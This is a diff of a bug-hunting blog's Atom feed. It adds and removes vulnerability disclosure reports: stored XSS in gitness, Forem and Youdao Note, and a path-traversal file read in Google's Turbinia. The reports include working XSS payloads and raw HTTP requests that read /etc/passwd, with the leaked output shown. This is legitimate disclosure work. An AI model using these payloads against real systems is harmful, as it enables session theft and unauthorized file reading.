@@ -1,4 +1,249 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-03T19:31:42+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://localhost:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-11T22:28:26+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Store XSS in gitness markdown comment editor</title><link href="http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Store XSS in gitness markdown comment editor" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://localhost:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Store XSS in gitness markdown comment editor</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-79: Cross-site Scripting (XSS) - Stored</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (7.3)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>An attacker can send malicous description when creating a pull request, or comment with malicious payload bellow an existing PR. Due to improper using of <a href="https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security">react-markdown-preview component</a>, html tags is not fully sanitized, and can be rendered with xss payload.</p>
+
+<p>In <a href="https://github.com/harness/gitness/blame/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L144">MarkdownViewer.tsx rehypeRewrite</a>. The sanitizing is not sufficient, only <code class="language-plaintext highlighter-rouge">a, input, checkbox, link</code> is sanitized, the rest html can be injected arbitrarily.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;MarkdownPreview
+    key={flag ? hash : 0}
+    source={markdown}
+    skipHtml={true}
+    warpperElement=data-color-mode
+    rehypeRewrite={(node, _index, parent) =&gt; {
+        if ((node as unknown as HTMLDivElement).tagName === 'a') {
+        if (parent &amp;&amp; /^h(1|2|3|4|5|6)/.test((parent as unknown as HTMLDivElement).tagName)) {
+            parent.children = parent.children.slice(1)
+        }
+        ...
+        }
+        if (
+        (node as unknown as HTMLDivElement).tagName === 'input' &amp;&amp;
+        (node as Unknown as Element)?.properties?.type === 'checkbox'
+        ) {
+        const lineNumber = parent?.position?.start?.line ? parent?.position?.start?.line - 1 : 0
+        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+        const element = node as any
+        element.properties['data-line-number'] = lineNumber.toString()
+        element.properties.disabled = !inDescriptionBox
+        }
+    }}
+    rehypePlugins={[
+        [rehypeVideo, { test: /\/(.*)(.mp4|.mov|.webm|.mkv|.flv)$/, details: null }],
+        [rehypeExternalLinks, { rel: ['nofollow noreferrer noopener'], target: '_blank' }]
+    ]}
+/&gt;
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<ol>
+  <li>
+    <p>Create an gitness server, using following command from official tutorial:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> docker run -d \
+ -p 3000:3000 \
+ -v /var/run/docker.sock:/var/run/docker.sock \
+ -v /tmp/gitness:/data \
+ --name gitness \
+ --restart always \
+ harness/gitness
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Create an empty repository, such as: <code class="language-plaintext highlighter-rouge">xss-test</code></p>
+
+    <p><img src="/assets/images/bughunter/gitness/create-repo.png" alt="repo" /></p>
+  </li>
+  <li>
+    <p>Open <code class="language-plaintext highlighter-rouge">Branches</code> section, new branch <code class="language-plaintext highlighter-rouge">branch2</code>. After create new branch, checkout to <code class="language-plaintext highlighter-rouge">branch2</code> and create new file <code class="language-plaintext highlighter-rouge">test</code> with any content, and commit the change.</p>
+
+    <p><img src="/assets/images/bughunter/gitness/new-branch.png" alt="branch" /></p>
+  </li>
+  <li>
+    <p>Open <code class="language-plaintext highlighter-rouge">Pull Requests</code> section, create new pull request, set base to <code class="language-plaintext highlighter-rouge">main</code> branch and compare to <code class="language-plaintext highlighter-rouge">branch2</code> branch. In <code class="language-plaintext highlighter-rouge">Description</code> markdown editor, send payload <code class="language-plaintext highlighter-rouge">&lt;iframe srcdoc="&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;&lt;/iframe&gt;</code>, and press the button <code class="language-plaintext highlighter-rouge">create pull request</code>. After creating the pr, an alert should pop up.</p>
+  </li>
+</ol>
+
+<p><img src="/assets/images/bughunter/gitness/pr1.png" alt="branch" /></p>
+
+<p><img src="/assets/images/bughunter/gitness/alert.png" alt="branch" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>Anyone who is capable to comment on pr or create pr can post a comment on a public project pull requests and injecting the xss.</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security">https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141">https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Google: Local File Inclusion in Turbinia API Server</title><link href="http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html" rel="alternate" type="text/html" title="Google: Local File Inclusion in Turbinia API Server" /><published>2024-05-08T10:31:06+08:00</published><updated>2024-05-08T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Local File Inclusion in Turbinia API Server</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>A local file inclusion is present in the Turbinia API Server when requesting resource files under the <code class="language-plaintext highlighter-rouge">/assets/{catchall:path}</code> route.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>The <a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L47">route</a> <code class="language-plaintext highlighter-rouge">/assets/{catchall:path}</code> is used for serving CSS and JS resources for Turbinia Web service. The <code class="language-plaintext highlighter-rouge">catchall</code> parameter in url is not sanitized before appended to base path, an attacker can use <code class="language-plaintext highlighter-rouge">../</code> to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@ui_router.get(
+    '/assets/{catchall:path}', name='assets', include_in_schema=False)
+async def serve_assets(request: Request):
+  """Serves assets content."""
+  static_content_path = pathlib.Path(_config.WEBUI_PATH).joinpath('dist/assets')
+  path = request.path_params['catchall']
+  file = static_content_path.joinpath(path)
+  if os.path.exists(file):
+    return FileResponse(file)
+
+  raise HTTPException(status_code=404, detail='Not found')
+</code></pre></div></div>
+
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+
+<p>Following official <a href="https://turbinia.readthedocs.io/en/latest/user/install.html#docker-installation">docker tutorial</a> to set up the Turbinia service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/google/turbinia.git
+cd turbinia
+mkdir -p ./conf &amp;&amp; mkdir -p ./tmp &amp;&amp; mkdir -p ./evidence &amp;&amp; mkdir -p ./certs &amp;&amp; chmod 777 ./conf ./tmp ./evidence ./certs
+sed -f docker/local/local-config.sed turbinia/config/turbinia_config_tmpl.py &gt; conf/turbinia.conf
+</code></pre></div></div>
+<p>Then, edit the <code class="language-plaintext highlighter-rouge">./docker/local/docker-compose.yml</code>, in <code class="language-plaintext highlighter-rouge">turbinia-api-server</code> section, expose Turbinia API Server port <code class="language-plaintext highlighter-rouge">8000</code> to host mechine by adding <code class="language-plaintext highlighter-rouge">ports: - "8000:8000"</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+turbinia-api-server:
+        #image: "turbinia-api-server-dev" # Use this for local development and comment out below line
+        image: "us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-api-server:latest" # Latest stable
+        container_name: turbinia-api-server
+        depends_on:
+            - redis
+        volumes:
+            - $PWD/evidence:/evidence
+            - $PWD/conf/turbinia.conf:/etc/turbinia/turbinia.conf
+        environment:
+            - LC_ALL=C.UTF-8
+            - LANG=C.UTF-8
+            - TURBINIA_EXTRA_ARGS=${TURBINIA_EXTRA_ARGS}
+        expose:
+            - "8000"
+        ports:
+            - "8000:8000"
+...
+</code></pre></div></div>
+<p>Finally, bring up the local Turbinia stack:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose -f ./docker/local/docker-compose.yml up
+</code></pre></div></div>
+
+<p>After service up, the Turbinia API Server will listen on <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code>. Open the webpage <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code> in browser and intecept requests using burp suite or chrome devtools. We can capture following request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:8000/assets/index-a76ac6aa.js HTTP/1.1
+Accept: */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cache-Control: no-cache
+Cookie: fakesession=hello
+Origin: http://0.0.0.0:8000
+Pragma: no-cache
+Referer: http://0.0.0.0:8000/web
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
+Host: 127.0.0.1:8000
+Accept-Encoding: gzip, deflate
+Connection: close
+</code></pre></div></div>
+
+<p>Modify the request by change <code class="language-plaintext highlighter-rouge">index-a76ac6aa.js</code> part to <code class="language-plaintext highlighter-rouge">..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code> which is <code class="language-plaintext highlighter-rouge">../../../../../../etc/passwd</code> url-encoded content.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Accept: */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cache-Control: no-cache
+Cookie: fakesession=hello
+Origin: http://0.0.0.0:8000
+Pragma: no-cache
+Referer: http://0.0.0.0:8000/web
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
+Host: 127.0.0.1:8000
+Accept-Encoding: gzip, deflate
+Connection: close
+</code></pre></div></div>
+
+<p>Or just open link: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code> in browser.</p>
+
+<p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+turbinia:x:999:999::/home/turbinia:/sbin/nologin
+</code></pre></div></div>
+
+<p><img src="/assets/cve/Turbinia.png" alt="Turbinia" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>Any file on the backend filesystem can be read by an attacker with access to the Turbinia API Server website.</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67">https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53">https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://localhost:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Dev.to(Forem) cta xss</p>
@@ -54,9 +299,27 @@
 
 <h3 id="root-cause">Root cause</h3>
 
-<p>Forem codebase: <a href="https://github.com/forem/forem/blob/154cd202b29186ede9850f9807ac4dc76eda6e34/app/views/liquids/_cta.html.erb#L1">_cta.html.erb</a></p>
+<p>Forem codebase:</p>
+
+<p><a href="https://github.com/forem/forem/blob/7c3e5b2b999f3cc830b02a2ec21735cc464bf16d/app/views/liquids/_cta.html.erb#L1">_cta.html.erb</a></p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="&lt;%= link %&gt;" class="ltag_cta ltag_cta--&lt;%= type %&gt;" role="button"&gt;&lt;%= description %&gt;&lt;/a&gt;
+</code></pre></div></div>
+
+<p><a href="https://github.com/forem/forem/blob/7c3e5b2b999f3cc830b02a2ec21735cc464bf16d/app/liquid_tags/cta_tag.rb#L21">render cta_tag</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render(_context)
+    content = Nokogiri::HTML.parse(super)
+
+    ApplicationController.render(
+      partial: PARTIAL,
+      locals: {
+        link: @link,
+        description: sanitized_description(content),
+        type: TYPE_OPTIONS.first
+      },
+    )
+  end
 </code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
@@ -1163,169 +1426,4 @@ ssh-rsa xxx hacker@test.com
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-drawio.html" rel="alternate" type="text/html" title="中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-drawio</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-drawio.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>有道云笔记网页端渲染流程图存在存储型XSS漏洞</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>存储型XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>中危</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-<ul>
-  <li>POC网页: <a href="https://note.youdao.com/s/QJo17hDz">https://note.youdao.com/s/QJo17hDz</a></li>
-  <li>视频链接：POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a> 提取码：1314</li>
-</ul>
-
-<h2 id="key-payload">Key Payload</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
-  &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
-    &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
-      &lt;root&gt;
-        &lt;mxCell id="0" /&gt;
-        &lt;mxCell id="1" parent="0" /&gt;
-        &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
-          &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
-            &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
-          &lt;/mxCell&gt;
-        &lt;/UserObject&gt;
-      &lt;/root&gt;
-    &lt;/mxGraphModel&gt;
-  &lt;/diagram&gt;
-&lt;/mxfile&gt;
-</code></pre></div></div>
-
-<h2 id="summary">Summary</h2>
-
-<p>网易有道云笔记可以上传流程图笔记，该笔记是xml格式的drawio文件。有道云笔记采用drawio插件对该文件进行渲染，然而，该插件版本过时并且存在存储型XSS漏洞。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。</p>
-
-<h3 id="detail">Detail</h3>
-
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>
-    <p>将下面payload保存为drawio文件，命名为xss.drawio。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
- &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
-     &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
-     &lt;root&gt;
-         &lt;mxCell id="0" /&gt;
-         &lt;mxCell id="1" parent="0" /&gt;
-         &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
-         &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
-             &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
-         &lt;/mxCell&gt;
-         &lt;/UserObject&gt;
-     &lt;/root&gt;
-     &lt;/mxGraphModel&gt;
- &lt;/diagram&gt;
- &lt;/mxfile&gt;
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>登录有道云笔记，<a href="https://note.youdao.com/">https://note.youdao.com/</a>. 点击左上侧“新建”，选择“上传文件”，将上一步的文件上传。</p>
-
-    <p><img src="/assets/images/youdaoyun2/save.png" alt="save" /></p>
-  </li>
-  <li>
-    <p>上传后，打开上传的流程图，xss触发。</p>
-
-    <p><img src="/assets/images/youdaoyun2/drawxss.png" alt="drawxss" /></p>
-  </li>
-  <li>
-    <p>将该笔记分享，发送给受害者打开，同样触发xss。</p>
-
-    <p><img src="/assets/images/youdaoyun2/share.png" alt="share" /></p>
-  </li>
-  <li>
-    <p>原因：drawio原始文件中，没有对UserObject元素的label字段进行过滤，导致label字段的xss得到执行。详见：<a href="https://github.com/jgraph/drawio/discussions/2791">https://github.com/jgraph/drawio/discussions/2791</a></p>
-  </li>
-</ol>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频</p>
-
-<p>POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a>
-提取码：1314</p>
-
-<h2 id="impact">Impact</h2>
-
-<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
-
-<h2 id="patch-advice">Patch advice</h2>
-
-<ol>
-  <li>升级渲染drawio的插件到最新版本</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页版白板存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-excalidraw.html" rel="alternate" type="text/html" title="中危：有道云笔记网页版白板存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-excalidraw</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-excalidraw.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>有道云笔记网页版白板存在存储型XSS漏洞</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>存储型XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>中危</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-<ul>
-  <li>POC网页: <a href="https://note.youdao.com/s/5DooTGzS">https://note.youdao.com/s/5DooTGzS</a></li>
-</ul>
-
-<h2 id="summary">Summary</h2>
-
-<p>有道云白板使用过时<code class="language-plaintext highlighter-rouge">excalidraw</code>，该插件存在已知xss漏洞：给任意白板元素添加链接时，没有过滤链接的协议，攻击者能够构造javascript链接，受害者点击元素后触发javascript payload执行</p>
-
-<h3 id="detail">Detail</h3>
-
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>
-    <p>打开有道云网页版，新建白板，在白板中画任意元素。</p>
-  </li>
-  <li>
-    <p>选定该元素，点击添加添加链接，链接框填写如下payload：<code class="language-plaintext highlighter-rouge">javascript://%0aalert(document.cookie)</code></p>
-
-    <p><img src="/assets/images/youdaoyun2/excalidraw1.png" alt="excalidraw1" /></p>
-  </li>
-  <li>
-    <p>点击元素链接后，xss触发。分享给他人，只需点击一次即可触发xss。</p>
-
-    <p><img src="/assets/images/youdaoyun2/excalidraw2.png" alt="excalidraw2" /></p>
-
-    <p><img src="/assets/images/youdaoyun2/excalidraw3.png" alt="excalidraw3" /></p>
-  </li>
-</ol>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频</p>
-
-<p>POC链接：
-https://note.youdao.com/s/5DooTGzS</p>
-
-<p>参考：<a href="https://github.com/advisories/GHSA-v7v8-gjv7-ffmr">https://github.com/advisories/GHSA-v7v8-gjv7-ffmr</a></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
-
-<h2 id="patch-advice">Patch advice</h2>
-
-<ol>
-  <li>升级渲染excalidraw插件到最新版本</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
